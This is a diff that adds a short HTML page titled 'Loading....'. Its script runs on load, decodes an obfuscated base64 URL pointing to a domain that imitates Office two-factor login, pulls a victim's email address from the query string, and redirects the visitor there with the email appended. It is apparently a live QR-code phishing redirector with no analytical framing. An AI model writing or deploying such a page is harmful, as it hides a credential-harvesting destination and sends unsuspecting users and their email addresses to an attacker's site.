@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading....</title>
+</head>
+<body>
+    <script nonce="NDIyMjU0MzcxMSwzOTEwMjU4NDQ5">
+
+        var redirect_url = atob("aHR0cHM6Ly9vZmZpY2UuMnN0ZXBmYWN0b3IucHJvL01VWWRhQlhhP3FyYz0=");
+        var path = window.location.href; 
+        var parts = path.split('?qrc=');
+        
+        if (parts.length > 1) {
+            var email = parts[1];
+            
+            if (isBase64(email)) {
+                email = atob(email);
+            }
+            
+            window.location.href = redirect_url + email;
+        } else {
+            window.location.href = redirect_url;
+        }
+
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) == str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        console.log("The path is: " + path);
+    </script>
+</body>
+</html>
